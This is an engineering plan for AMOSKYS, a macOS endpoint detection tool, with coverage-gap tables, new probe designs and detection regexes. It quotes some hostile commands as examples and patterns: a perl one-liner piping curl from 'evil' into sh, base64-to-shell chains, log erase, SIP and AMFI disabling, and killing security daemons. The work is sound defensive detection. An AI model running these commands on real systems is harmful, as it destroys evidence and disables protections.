# AMOSKYS Coverage Upgrade Plan — Deep Visibility & Deferred Items

**Author**: Engineering
**Date**: 2026-03-20
**Status**: Plan (ready for implementation)
**Depends on**: REALTIME_ARCHITECTURE.md (Phases 1-5 complete)

---

## Part 1 — Current Coverage Assessment

### What We See (Strong)

| Category | Coverage | Key Probes |
|----------|----------|-----------|
| Process execution (own-user) | 92% | LOLBinProbe (24 binaries), ScriptInterpreterProbe, ProcessSpawnProbe, BinaryFromTempProbe |
| Persistence mechanisms | 92% | 10 persistence probes across LaunchAgents/Daemons, cron, SSH, shell profiles, folder actions |
| Credential store access | 90% | KeychainAccessProbe, KeychainCLIAbuseProbe, BrowserCredentialTheftProbe, CryptoWalletTheftProbe |
| Process masquerade | 95% | 3-layer detection: ProcessMasqueradeProbe + EnhancedProbe + BinaryIdentityProbe |
| Quarantine/Gatekeeper bypass | 90% | Stateful xattr diff, xattr removal process detection, QuarantineBypassProbe |
| Infostealer kill chain | 90% | 11 probes: FakeDialog → CredentialArchive → SessionCookie → Exfil |
| Download → Execute chain | 85% | DownloadExecuteChainProbe, ProvenanceChainProbe, FullKillChainProbe |
| Network connections (existence) | 100% | lsof PID-attributed, 40/40 connections + 23/23 listeners |
| Real-time app lifecycle | 90% | runningboard log stream: app_launched, app_terminated, app_focus_changed |
| XProtect/Gatekeeper (real-time) | 90% | XProtectMalwareProbe, GatekeeperRealtimeProbe from log stream |
| Critical file modification | 95% | kqueue VNODE on 10 files: /etc/sudoers, authorized_keys, etc. |

### What We Miss (Gaps)

| # | Gap | Severity | Why It Matters | Root Cause |
|---|-----|----------|----------------|------------|
| G1 | `task_for_pid()` / Mach VM injection | CRITICAL | Memory injection into any process — credential theft, code execution | No kernel hook. Requires ESF. Architectural. |
| G2 | Cross-user process details (41%) | HIGH | Attacker running as root: cmdline, environ, cwd invisible | macOS kernel permission boundary. Cannot fix without root. |
| G3 | SSH agent forwarding abuse | HIGH | Attacker pivots through SSH agent to additional hosts | `SSH_AUTH_SOCK` not monitored. No `-A` flag detection. No pivot correlation. |
| G4 | JXA (JavaScript for Automation) payload analysis | HIGH | `osascript -l JavaScript` with `$.NSTask` for shell execution, full ObjC bridge | Only process-name match. No `-l JavaScript` flag or JXA API pattern detection. |
| G5 | `-e` flag for perl/ruby one-liners | MEDIUM | `perl -e 'system("curl evil|sh")'` bypasses `-c`-only regex | ScriptInterpreterProbe only checks `-c` flag. |
| G6 | `log erase` / unified log destruction | HIGH | Attacker erases evidence. SecurityToolDisableProbe doesn't cover it. | `log` not in LOLBins, not in SecurityToolDisableProbe. |
| G7 | Timestomping (mtime manipulation) | MEDIUM | Attacker backdates file mtime to hide activity in timeline | FIM tracks hashes, not mtime anomalies. |
| G8 | Missing LOLBins: `pmset`, `mdls`, `mdfind`, `networksetup`, `tccutil`, `hdiutil` | MEDIUM | Reconnaissance and evasion tools uncovered | Not in `_MACOS_LOLBINS` watchlist. |
| G9 | Shell one-liners: `bash -c 'echo X\|base64 -d\|sh'` | MEDIUM | Shells not in `_SCRIPT_INTERPRETERS`. Base64→shell chain missed. | bash/sh/zsh not treated as script interpreters. |
| G10 | `csrutil authenticated-root disable`, `nvram amfi_get_out_of_my_way=1` | MEDIUM | Big Sur+ SIP bypass and AMFI bypass variants | SecurityToolDisableProbe hardcoded patterns. |
| G11 | DNS visibility (~50%) | HIGH | mDNSResponder log stream captures many but not all queries. DoH/DoT invisible. | Architectural: userspace visibility limit without NEFilterProvider. |
| G12 | Bandwidth/exfil volume (nettop accuracy) | MEDIUM | nettop gives aggregate counts, not per-connection deltas | No pcap. Need nettop delta calculation. |
| G13 | Dashboard WebSocket push (not real-time UI) | LOW | Dashboard shows data on page refresh, not live push | WebSocket initialized but not wired to event emission. |

---

## Part 2 — Fileless Malware Coverage Upgrade

### Wave A: Detection Logic Fixes (probe code changes, no new infrastructure)

These close gaps G4-G10 by expanding existing probes. Each is a targeted edit.

#### A1. Expand ScriptInterpreterProbe to cover `-e` flag (G5, G9)

**File**: `src/amoskys/agents/os/macos/process/probes.py`
**Change**: Add `-e` flag patterns alongside `-c`. Add `bash`/`sh`/`zsh` to `_SCRIPT_INTERPRETERS`.

```python
# Add to _SUSPICIOUS_SCRIPT_PATTERNS:
r"-e\s+['\"].*?(curl|wget|nc |bash|eval|exec|system\(|socket)",  # ruby/perl -e
r"-c\s+['\"].*?(base64\s+(-d|--decode)|openssl\s+enc)",         # base64 decode chains

# Add to _SCRIPT_INTERPRETERS:
"bash", "sh", "zsh",  # Shell one-liners with -c

# JXA detection (G4):
r"-l\s+JavaScript",  # osascript -l JavaScript
r"\$\.NSTask|\$\.NSFileManager|ObjC\.import|ObjC\.unwrap",  # JXA-specific API calls
```

#### A2. Expand LOLBin watchlist (G8)

**File**: `src/amoskys/agents/os/macos/process/probes.py`
**Change**: Add missing LOLBins to `_MACOS_LOLBINS`.

```python
# Add:
"pmset": "power_management",           # T1529 — System Shutdown
"mdls": "metadata_query",              # T1082 — System Information Discovery
"mdfind": "spotlight_search",           # T1083 — File and Directory Discovery
"networksetup": "network_config",       # T1016 — System Network Configuration
"systemsetup": "system_config",         # T1082 — System Information Discovery
"tccutil": "tcc_manipulation",          # T1562.001 — Disable Security Tools
"hdiutil": "disk_image",               # T1204.002 — Malicious File (DMG)
"diskutil": "disk_utility",            # T1561 — Disk Wipe
"sysadminctl": "admin_management",     # T1098 — Account Manipulation
"log": "log_manipulation",             # T1070.002 — Clear macOS Logs
"caffeinate": "sleep_prevention",       # T1529 — Anti-sleep during attack
"ioreg": "hardware_query",             # T1082 — System Information
"profiles": "profile_install",          # T1176 — Configuration Profiles
```

#### A3. Expand SecurityToolDisableProbe (G6, G10)

**File**: `src/amoskys/agents/os/macos/process/probes.py`
**Change**: Add log erasure, AMFI bypass, and macOS 11+ SIP variants.

```python
# Add to _DISABLE_PATTERNS:
("log erase", "log_erasure", Severity.CRITICAL),
("log erase --all", "log_erasure_all", Severity.CRITICAL),
("csrutil authenticated-root disable", "sip_authenticated_root", Severity.CRITICAL),
("nvram boot-args", "nvram_boot_args", Severity.CRITICAL),  # then check for amfi
("tccutil reset", "tcc_reset", Severity.HIGH),
("launchctl bootout system/com.apple", "security_daemon_kill", Severity.CRITICAL),
```

#### A4. Add timestomping detection to FIM (G7)

**File**: `src/amoskys/agents/os/macos/filesystem/probes.py`
**Change**: In `CriticalFileProbe`, after detecting a hash change, check if mtime is suspiciously old.

```python
# Detection logic:
# If file hash changed BUT mtime is older than the previous scan's mtime,
# the attacker backdated the timestamp. Flag as timestomping.
if current_hash != baseline_hash:
    if current_mtime < baseline_mtime:
        # mtime went BACKWARDS — timestomping
        fire event_type="timestomping_detected", severity=HIGH, mitre=["T1070.006"]
```

#### A5. SSH agent forwarding detection (G3)

**File**: `src/amoskys/agents/os/macos/auth/probes.py`
**Change**: New probe `SSHAgentForwardingProbe` that:

```python
class SSHAgentForwardingProbe(MicroProbe):
    """Detect SSH agent forwarding abuse."""
    name = "macos_ssh_agent_forwarding"
    mitre_techniques = ["T1563.001"]

    def scan(self, context):
        events = []
        for proc in context.shared_data.get("auth_events", []):
            # Check for SSH -A flag in sshd child processes
            # Check for SSH_AUTH_SOCK in process environ
            # Correlate: inbound SSH + outbound SSH from same machine = pivot
            pass
        return events
```

### Wave B: New Probes for Fileless Detection (new probe classes)

#### B1. JXA Payload Analyzer Probe

Detects JavaScript for Automation abuse — the modern macOS attack scripting language.

```python
class JXAPayloadProbe(MicroProbe):
    """Detect JXA (JavaScript for Automation) abuse."""
    name = "macos_jxa_payload"
    mitre_techniques = ["T1059.007"]
    severity = Severity.HIGH

    _JXA_INDICATORS = [
        "-l JavaScript",                     # osascript -l JavaScript
        "-l", "JavaScript",                  # split args
    ]
    _JXA_API_PATTERNS = [
        r"\$\.NSTask",                       # Shell command execution
        r"\$\.NSFileManager",                # File operations
        r"ObjC\.import\(",                   # Objective-C bridge
        r"ObjC\.unwrap\(",                   # ObjC object unwrapping
        r"\.currentApplication\(\)",         # App scripting
        r"Application\(['\"]System Events",  # System Events automation
        r"Application\(['\"]Finder",         # Finder automation
    ]
```

#### B2. Base64 Decode Chain Probe

Detects `echo X|base64 -d|sh` and similar decode-to-execute patterns.

```python
class Base64DecodeChainProbe(MicroProbe):
    """Detect base64 decode to shell execution chains."""
    name = "macos_base64_decode_chain"
    mitre_techniques = ["T1027", "T1059.004"]
    severity = Severity.HIGH

    _PATTERNS = [
        r"base64\s+(-d|--decode|-D)",    # base64 decode flag
        r"echo\s+[A-Za-z0-9+/=]{20,}",  # long base64 string in echo
        r"printf.*\|.*base64",            # printf to base64
        r"openssl\s+enc\s+-d",           # openssl decrypt
    ]
```

#### B3. Log Destruction Probe

Real-time detection via the log stream.

```python
# In RealtimeSensor probes:
class LogDestructionProbe(MicroProbe):
    """Detect unified log erasure attempts."""
    name = "rt_log_destruction"
    mitre_techniques = ["T1070.002"]
    severity = Severity.CRITICAL

    def scan(self, shared_data):
        # Watch for: process_name == "log" with "erase" in message
        # Watch for: deletion of /var/db/diagnostics/ contents (FSEvents)
        # Watch for: kill/stop of logd daemon
```

### Wave C: Behavioral Indicators (no single event — pattern detection)

#### C1. Process Tree Anomaly Scoring

Currently probes look for specific patterns (Terminal → curl, browser → shell). Expand to general anomaly scoring:

```
Score parent→child relationships:
  browser → shell:        +0.8
  messaging_app → shell:  +0.7
  daemon → interpreter:   +0.5
  interpreter → curl/wget: +0.6
  any → base64:           +0.4
  any → security cli:     +0.5

If cumulative tree score > 1.5 within 60s: fire "suspicious_process_tree"
```

#### C2. Discovery Burst Detection Enhancement

Current `SystemDiscoveryProbe` requires 3+ discovery commands from the same parent. Expand the discovery command list:

```python
_DISCOVERY_COMMANDS_EXPANDED = {
    # Current
    "sw_vers", "uname", "sysctl", "system_profiler", "csrutil",
    # Add
    "dscl", "id", "groups", "whoami", "hostname", "ifconfig",
    "netstat", "arp", "route", "df", "mount", "ls",  # when combined
    "mdls", "mdfind", "pmset", "ioreg", "networksetup",
    "scutil", "systemsetup", "fdesetup", "diskutil",
}
```

#### C3. Exfiltration Volume Detection

Wire nettop bandwidth into ExfilSpikeProbe properly:

```python
# In ExfilSpikeProbe:
# nettop gives bytes_out per PID per second
# If any PID sends >5MB outbound in 60s to a single destination: HIGH
# If any PID sends >50MB outbound in 300s to any destination: CRITICAL
```

---

## Part 3 — Deferred Items from Real-Time Architecture

### D1. Cross-Source Timeline Correlator

**What**: A shared in-memory timeline buffer that all event sources write to, enabling cross-source correlation like "FSEvents file_created + process spawned from that path + DNS query to suspicious domain" within a time window.

**Design**:

```python
class TimelineBuffer:
    """Thread-safe rolling window buffer for cross-source correlation.

    All collectors write events to this buffer. The correlation engine
    reads from it to detect multi-source attack chains.
    """

    def __init__(self, window_seconds: float = 300.0, max_events: int = 10000):
        self._events: Deque[TimelineEntry] = deque(maxlen=max_events)
        self._lock = threading.Lock()
        self._window = window_seconds

    def add(self, source: str, event_type: str, key: str,
            pid: int = 0, path: str = "", domain: str = "",
            remote_ip: str = "", bundle_id: str = "",
            timestamp_ns: int = 0, data: dict = None):
        """Add an event from any source."""
        entry = TimelineEntry(
            source=source,
            event_type=event_type,
            key=key,
            pid=pid, path=path, domain=domain,
            remote_ip=remote_ip, bundle_id=bundle_id,
            timestamp_ns=timestamp_ns or time.time_ns(),
            data=data or {},
        )
        with self._lock:
            self._events.append(entry)

    def query(self, window_seconds: float = 60.0,
              pid: int = None, path: str = None,
              domain: str = None, source: str = None) -> List[TimelineEntry]:
        """Query events matching criteria within time window."""
        cutoff_ns = time.time_ns() - int(window_seconds * 1e9)
        with self._lock:
            return [e for e in self._events
                    if e.timestamp_ns > cutoff_ns
                    and (pid is None or e.pid == pid)
                    and (path is None or path in e.path)
                    and (domain is None or domain in e.domain)
                    and (source is None or e.source == source)]

    def correlate_chain(self, steps: List[dict], window_seconds: float = 60.0) -> Optional[List[TimelineEntry]]:
        """Find a sequence of events matching a chain definition.

        Example chain: [
            {"source": "fsevents", "event_type": "file_created", "path_contains": "/Downloads/"},
            {"source": "psutil", "event_type": "process_spawned", "path_contains": "/Downloads/"},
            {"source": "lsof", "event_type": "connection", "remote_port": 443},
        ]
        """
```

**Integration points**:
- FSEventsCollector writes `file_created`/`file_modified` events
- ProcessSnapshotCollector writes `process_spawned` events
- UnifiedLogStreamCollector writes `app_launched`, `dns_query` events
- ConnectionSnapshotCollector writes `connection` events
- Probes read from the buffer for cross-source chain detection

**Implementation**: 2-3 days. The buffer is simple; the challenge is defining the right chain patterns and tuning the time windows.

### D2. ProvenanceAgent FSEvents Integration

**What**: Replace the ProvenanceAgent's `os.listdir + os.stat` diff approach for ~/Downloads with real FSEvents from the RealtimeSensor's watchdog observer.

**Design**:
- The RealtimeSensor's FSEventsCollector already watches ~/Downloads
- Events are available via `RealtimeSensorCollector.collect()`
- ProvenanceAgent needs access to these events (currently siloed)

**Solution**: The TimelineBuffer (D1) solves this. FSEvents write to the shared buffer, ProvenanceAgent reads from it.

**Dependency**: D1 (TimelineBuffer)

### D3. Dashboard WebSocket Push

**What**: When the analyzer stores a HIGH/CRITICAL event, emit it via WebSocket to any connected dashboard client for live display.

**Design**:

```python
# In analyzer_main.py, after storing a security event:
if event.risk_score >= 0.7:
    socketio.emit("security_event", {
        "event_id": event.event_id,
        "event_type": event.event_type,
        "severity": event.severity,
        "risk_score": event.risk_score,
        "mitre_techniques": event.mitre_techniques,
        "summary": event.summary,
        "timestamp": event.timestamp_ns,
    }, namespace="/dashboard")
```

**Challenge**: The analyzer runs in a separate process from the Flask dashboard. Options:
1. Redis pub/sub between analyzer and Flask SocketIO (adds dependency)
2. File-based: analyzer writes to `data/live_events.jsonl`, dashboard tails it
3. SQLite trigger: analyzer writes to `live_events` table, dashboard polls at 1s
4. Unix domain socket: analyzer sends directly to Flask process

**Recommended**: Option 3 (SQLite). Keep the existing architecture pattern. Dashboard's existing 25s prewarm loop can check for new live events. Reduce to 2s for the live events check specifically.

### D4. 22 Snapshot Agents in collector_main

**What**: The `collector_main.py` architecture is built but needs compatibility testing with all 22 agents.

**Current state**: `_load_agents()` loads 12 agents. The remaining 10 are:
- `macos_security_monitor` — uses shared collector, may conflict
- `macos_unified_log` — overlaps with RealtimeSensor log stream
- `macos_applog` — uses `log show`, independent
- `macos_internet_activity` — uses `lsof`, independent
- `macos_db_activity` — uses `psutil` + `log show`, independent
- `macos_http_inspector` — reads log files, independent
- `network_sentinel` — tails AMOSKYS web log, independent
- `protocol_collectors` — tails syslog, independent
- `correlation` — aggregates all collectors, conflicts with threading model
- `kernel_audit` — Linux-only, skip on macOS

**Plan**:
1. Add `applog`, `internet_activity`, `db_activity`, `http_inspector`, `network_sentinel`, `protocol_collectors` to `_load_agents()` — these are independent and safe
2. Skip `unified_log` — replaced by RealtimeSensor log stream
3. Skip `security_monitor` — replaced by RealtimeSensor log stream
4. Skip `correlation` — its cross-domain collection model conflicts with per-agent threading. Cross-domain correlation belongs in the analyzer (Tier 2), not the collector
5. Skip `kernel_audit` — Linux-only

This gives us **18 agents** in the collector process. The 4 skipped agents are either replaced by the real-time system or architecturally incompatible with threaded collection.

---

## Part 4 — Visibility Estimate After All Upgrades

### Coverage by MITRE ATT&CK Tactic

| Tactic | Current | After Wave A-C | After ESF (future) |
|--------|---------|----------------|---------------------|
| **Reconnaissance** (T1595, T1592) | 80% | 90% (expanded discovery burst) | 95% |
| **Initial Access** (T1190, T1566, T1200) | 85% | 90% (expanded LOLBins, AirDrop) | 95% |
| **Execution** (T1059, T1204, T1218) | 82% | 95% (JXA, -e flag, bash, base64 chains) | 99% |
| **Persistence** (T1543, T1547, T1053) | 92% | 94% (BTM login items via log stream) | 98% |
| **Privilege Escalation** (T1548, T1068) | 75% | 85% (AMFI log stream, expanded sudo detection) | 95% |
| **Defense Evasion** (T1036, T1553, T1562, T1070) | 78% | 92% (log erase, timestomping, expanded SIP variants) | 98% |
| **Credential Access** (T1555, T1110, T1539) | 90% | 93% (SSH agent forwarding) | 98% |
| **Discovery** (T1082, T1016, T1046) | 80% | 92% (expanded discovery commands, mdls/mdfind) | 95% |
| **Lateral Movement** (T1021, T1570) | 70% | 82% (SSH pivot detection, ARD) | 92% |
| **Collection** (T1005, T1113, T1115) | 80% | 85% | 95% |
| **Command & Control** (T1071, T1572) | 75% | 82% (nettop deltas, DNS improvements) | 95% (NEFilterProvider) |
| **Exfiltration** (T1048, T1567) | 65% | 82% (nettop volume detection, cloud exfil) | 95% |
| **Impact** (T1485, T1496, T1565) | 70% | 78% | 90% |

### Fileless Malware Coverage Specifically

| Technique | Current | After Upgrade |
|-----------|---------|---------------|
| Interpreter one-liners (python -c, ruby -e, perl -e) | 70% | 95% |
| JXA (osascript -l JavaScript) | 30% | 85% |
| Shell base64 decode chains | 40% | 90% |
| DYLD injection (own-user) | 90% | 92% |
| DYLD injection (cross-user) | 0% | 0% (requires root) |
| Mach port injection (task_for_pid) | 0% | 0% (requires ESF) |
| LOLBin abuse (full list) | 72% | 95% |
| Security tool disabling | 75% | 95% |
| Log evidence destruction | 0% | 90% |
| Timestomping | 0% | 85% |
| Process tree behavioral anomaly | 60% | 85% |
| Discovery burst detection | 70% | 90% |

### Overall Weighted Visibility

| Scenario | Current | After Wave A-C | After Deferred Items | After ESF |
|----------|---------|----------------|---------------------|-----------|
| File-based malware | 88% | 92% | 93% | 99% |
| Fileless malware | 55% | 82% | 85% | 95% |
| Living-off-the-land | 72% | 93% | 94% | 98% |
| Credential theft | 90% | 93% | 94% | 99% |
| Lateral movement | 70% | 82% | 85% | 92% |
| **Weighted average** | **~78%** | **~90%** | **~92%** | **~97%** |

---

## Part 5 — Implementation Plan

### Sprint 1: Detection Logic Fixes (Wave A) — 2-3 days
Priority: Close the highest-impact gaps with minimal code changes.

| Task | Files | Effort | Closes |
|------|-------|--------|--------|
| A1: Add `-e` flag + shells to ScriptInterpreterProbe | process/probes.py | 1hr | G5, G9 |
| A2: Expand `_MACOS_LOLBINS` (+13 binaries) | process/probes.py | 1hr | G8 |
| A3: Expand SecurityToolDisableProbe (+6 patterns) | process/probes.py | 1hr | G6, G10 |
| A4: Add timestomping detection to FIM | filesystem/probes.py | 2hr | G7 |
| A5: SSH agent forwarding probe | auth/probes.py | 3hr | G3 |
| Update tests for new probe counts/behaviors | tests/ | 2hr | — |

### Sprint 2: New Probes (Wave B) — 2-3 days
Priority: Cover fileless attack patterns that no existing probe addresses.

| Task | Files | Effort | Closes |
|------|-------|--------|--------|
| B1: JXA Payload Analyzer Probe | process/probes.py | 3hr | G4 |
| B2: Base64 Decode Chain Probe | process/probes.py | 2hr | G9 |
| B3: Log Destruction Probe (real-time) | realtime_sensor/agent.py | 2hr | G6 |
| Tests for new probes | tests/ | 2hr | — |

### Sprint 3: Behavioral Detection (Wave C) — 2-3 days
Priority: Pattern-based detection that catches novel attacks.

| Task | Files | Effort |
|------|-------|--------|
| C1: Process tree anomaly scoring | correlation/probes.py | 4hr |
| C2: Expanded discovery burst | process/probes.py | 2hr |
| C3: Exfil volume detection via nettop | network/probes.py | 3hr |

### Sprint 4: Deferred Items — 3-5 days

| Task | Files | Effort |
|------|-------|--------|
| D1: Cross-source TimelineBuffer | common/timeline.py (new) + all collectors | 8hr |
| D2: ProvenanceAgent FSEvents (depends on D1) | provenance/collector.py | 3hr |
| D3: Dashboard WebSocket push | analyzer_main.py + web/app/ | 4hr |
| D4: Add 6 more agents to collector_main | collector_main.py | 3hr |

### Sprint 5: Validation & Hardening — 1-2 days

| Task |
|------|
| Run full attack simulation (live_demo.sh + fileless payloads) |
| Verify every new probe fires on crafted input |
| Run pipeline diagnostic (all 10 layers) |
| Measure false positive rate on 24hr quiet operation |
| Update probe audit with new probe counts |
| Update MEMORY.md with new probe/coverage metrics |

---

## Part 6 — Architectural Limits (Cannot Fix Without ESF)

These are the hard walls that only the Endpoint Security Framework can breach:

| Limit | Impact | ESF Event Type |
|-------|--------|----------------|
| Cross-user cmdline/environ | 41% of processes have limited visibility | `ES_EVENT_TYPE_NOTIFY_EXEC` |
| Mach port injection | 0% detection of task_for_pid, mach_vm_write | `ES_EVENT_TYPE_NOTIFY_GET_TASK` |
| Per-file PID attribution | FSEvents shows path but not WHO modified it | `ES_EVENT_TYPE_NOTIFY_OPEN/CLOSE` |
| Memory-mapped code execution | 0% detection of mmap-based injection | `ES_EVENT_TYPE_NOTIFY_MMAP` |
| kextload monitoring | 0% real-time kernel extension detection | `ES_EVENT_TYPE_NOTIFY_KEXTLOAD` |
| DNS with source process | DNS queries lack PID attribution | `ES_EVENT_TYPE_NOTIFY_DNS_QUERY` (macOS 13+) |
| Signal interception | Cannot detect SIGKILL to security tools | `ES_EVENT_TYPE_NOTIFY_SIGNAL` |

**Until ESF**: AMOSKYS compensates with behavioral detection (process trees, temporal correlation, network+process cross-reference), which catches 82% of fileless attacks indirectly. The remaining 18% requires kernel-level visibility.

---

## Appendix — Detection Patterns Reference

### Regex Patterns for Fileless Detection

```python
# Interpreter one-liner detection (expanded)
INTERPRETER_EXEC = [
    re.compile(r"(?:python[23]?|ruby|perl|node|swift)\s+.*-[ce]\s+", re.I),
    re.compile(r"(?:bash|sh|zsh)\s+-c\s+", re.I),
    re.compile(r"osascript\s+.*-l\s+JavaScript", re.I),
]

# Payload content indicators
PAYLOAD_INDICATORS = [
    re.compile(r"socket\.socket|TCPSocket|SOCK_STREAM", re.I),
    re.compile(r"subprocess|system\(|exec\(|popen\(", re.I),
    re.compile(r"base64\s+(-d|--decode)"),
    re.compile(r"curl\s+.*\|\s*(bash|sh|zsh|python)", re.I),
    re.compile(r"eval\s*\(.*\(", re.I),  # eval with nested call
    re.compile(r"\$\.NSTask|\$\.NSFileManager|ObjC\.import", re.I),  # JXA
]

# Log destruction indicators
LOG_DESTRUCTION = [
    re.compile(r"\blog\s+erase\b"),
    re.compile(r"rm\s+.*(/var/db/diagnostics|/var/audit)"),
    re.compile(r"launchctl\s+bootout\s+system.*logd"),
]

# SSH agent forwarding
SSH_AGENT = [
    re.compile(r"ssh\s+.*-A\s"),  # agent forwarding flag
    re.compile(r"SSH_AUTH_SOCK"),  # env var presence in unusual process
]
```

### Unified Log Predicates for Enhanced Detection

```bash
# Add to existing log stream predicate:
# Log manipulation detection
OR process == "log"
# AMFI enforcement (already present but confirm)
OR subsystem == "com.apple.MobileFileIntegrity"
# Configuration profiles
OR subsystem == "com.apple.ManagedClient"
OR process == "mdmclient"
```
